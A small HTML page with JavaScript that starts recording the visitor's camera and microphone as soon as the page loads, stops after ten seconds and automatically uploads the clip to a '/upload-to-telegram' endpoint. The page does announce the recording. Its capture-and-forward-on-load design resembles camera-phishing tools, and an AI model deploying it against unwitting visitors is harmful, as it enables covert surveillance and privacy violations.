<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Video Recorder</title>
</head>
<body>
  <h2>Recording Automatically and Sending to Telegram...</h2>

  <video id="preview" autoplay muted playsinline style="width: 320px; height: 240px; border: 1px solid black;"></video>

  <script>
    let mediaRecorder;
    let recordedChunks = [];

    async function initCameraAndRecord() {
      try {
        // Access camera and microphone
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById("preview").srcObject = stream;

        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

        mediaRecorder.ondataavailable = e => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.onstop = async () => {
          const recordedBlob = new Blob(recordedChunks, { type: "video/webm" });

          // Stop all tracks
          stream.getTracks().forEach(track => track.stop());

          // Send to Telegram automatically
          const formData = new FormData();
          formData.append("video", recordedBlob, "recording.webm");

          try {
            const res = await fetch("/upload-to-telegram", { method: "POST", body: formData });
            alert(await res.text());
          } catch (err) {
            console.error(err);
            alert("âŒ Error sending video");
          }
        };

        // Start recording immediately
        mediaRecorder.start();
        console.log("Recording started...");

        // Stop automatically after 10 seconds (adjust duration if needed)
        setTimeout(() => {
          mediaRecorder.stop();
          console.log("Recording stopped and sending...");
        }, 10000);

      } catch (err) {
        console.error("Error accessing camera:", err);
      }
    }

    // Start everything as soon as the page loads
    window.onload = initCameraAndRecord;
  </script>
</body>
</html>
